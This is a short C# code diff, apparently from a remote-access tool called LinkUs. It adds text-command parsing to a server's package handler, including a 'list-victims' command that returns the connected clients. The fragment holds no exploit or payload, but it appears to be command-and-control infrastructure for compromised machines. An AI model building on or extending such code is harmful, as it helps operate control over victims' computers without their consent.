@@ -26,10 +26,17 @@ namespace LinkUs
         {
             Console.WriteLine(package);
             if (Equals(package.Destination, ClientId.Server)) {
-                var clients = _connector.GetClients();
-                var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
-                var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(value));
-                _connector.SendDataAsync(packageResponse);
+                var commandLine = Encoding.GetString(package.Content);
+                if (commandLine == "list-victims") {
+                    var clients = _connector.GetClients();
+                    var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
+                    var packageResponse = package.CreateResponsePackage(Encoding.GetBytes(value));
+                    _connector.SendDataAsync(packageResponse);
+                }
+                else {
+                    var responsePackage = package.CreateResponsePackage(Encoding.GetBytes("Invalid command"));
+                    _connector.SendDataAsync(responsePackage);
+                }
             }
             else {
                 _connector.SendDataAsync(package);
